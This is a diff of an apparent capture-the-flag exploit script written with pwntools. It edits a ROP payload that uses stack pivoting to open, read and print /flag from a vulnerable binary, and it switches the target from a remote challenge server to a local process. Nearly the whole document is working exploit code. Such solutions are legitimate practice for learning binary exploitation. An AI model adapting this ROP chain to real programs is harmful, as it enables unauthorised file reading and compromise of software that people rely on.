@@ -1,8 +1,8 @@
 from pwn import *
 
 context.log_level = "debug"
-#io = process("./vuln")
-io = remote("node5.anna.nssctf.cn", 21408)
+io = process("./vuln")
+#io = remote("node5.anna.nssctf.cn", 21408)
 elf = ELF("./vuln")
 libc = ELF("./libc-2.31.so")
 
@@ -43,37 +43,7 @@ io.recvuntil(b"task.")
 io.send(payload)
 raw_input("wait")
 
-payload = (
-    b"/flag\00\x00\x00"
-    + p64(pop_rdi)
-    + p64(bss + 0x300)
-    + p64(pop_rsi)
-    + p64(0)
-    + p64(open_addr)
-)  # rdi储存bss+0x300地址处的值，也就是我们的flag
-payload += (
-    p64(pop_rdi)
-    + p64(3)
-    + p64(pop_rsi)
-    + p64(bss + 0x300)
-    + p64(pop_rdx)
-    + p64(0x100)
-    + p64(read_addr)
-)  # 从bss + 0x300处读取文件信息
-payload += (
-    p64(pop_rdi)
-    + p64(1)
-    + p64(pop_rsi)
-    + p64(bss + 0x300)
-    + p64(pop_rdx)
-    + p64(0x100)
-    + p64(write_addr)
-)  # 将bss + 0x300处的数据输出出来
-payload = payload.ljust(0x100, b"\x00")
-payload += (
-    p64(bss + 0x300) + p64(leave_ret)
-)  # 因为我们的ROP链在bss区上，所以我们要用栈迁移迁过去，至于为什么bss + 0x300没有减0x08，是因为开头输入了flag并对齐了8字节，无需再关注两次leave带来的rsp抬高0x08个字节
-
+# open(path, 0);
 payload1 = (
     b"/flag\x00\x00\x00"
     + p64(pop_rdi)
@@ -82,6 +52,8 @@ payload1 = (
     + p64(0)
     + p64(open_addr)
 )
+
+# read(fd, addr, size);
 payload1 += (
     p64(pop_rdi)
     + p64(3)
@@ -91,6 +63,8 @@ payload1 += (
     + p64(0x100)
     + p64(read_addr)
 )
+
+# write(1, addr, size);
 payload1 += (
     p64(pop_rdi)
     + p64(1)
@@ -104,6 +78,5 @@ payload1 = payload1.ljust(0x100, b"\x00")
 payload1 += p64(bss + 0x300) + p64(leave_ret)
 
 io.send(payload1)
-
 
 io.interactive()
